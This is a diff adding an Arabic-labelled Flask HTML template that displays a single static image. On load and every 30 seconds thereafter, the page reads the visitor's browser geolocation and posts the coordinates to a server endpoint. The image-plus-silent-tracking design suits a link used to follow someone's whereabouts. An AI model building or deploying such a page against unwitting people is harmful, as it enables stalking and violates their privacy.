@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تتبع الموقع مع صورة ثابتة</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        #image { 
+            display: block;
+            margin: 0 auto;
+            max-width: 100%;
+            height: auto;
+        }
+    </style>
+</head>
+<body>
+    <h1>تتبع الموقع (تلقائي)</h1>
+    <!-- استخدام url_for لعرض الصورة بشكل صحيح على PythonAnywhere -->
+    <img id="image" src="{{ url_for('static', filename='a.png') }}" alt="صورة ثابتة">
+
+    <script>
+        function sendLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
+            } else {
+                alert("المتصفح لا يدعم تحديد الموقع الجغرافي.");
+            }
+        }
+
+        function successCallback(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            console.log("Latitude: " + latitude + "°, Longitude: " + longitude);
+
+            // إرسال بيانات الموقع للسيرفر
+            $.ajax({
+                url: '/automatic_save',
+                method: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify({latitude: latitude, longitude: longitude}),
+                success: function(response) {
+                    console.log(response.message);
+                },
+                error: function(xhr, status, error) {
+                    console.error('حدث خطأ أثناء محاولة حفظ الموقع:', error);
+                }
+            });
+        }
+
+        function errorCallback(error) {
+            console.error("تعذر الحصول على الموقع:", error.message);
+        }
+
+        // إرسال الموقع عند تحميل الصفحة
+        sendLocation();
+
+        // إعادة الإرسال كل 30 ثانية
+        setInterval(sendLocation, 30000);
+    </script>
+</body>
+</html>
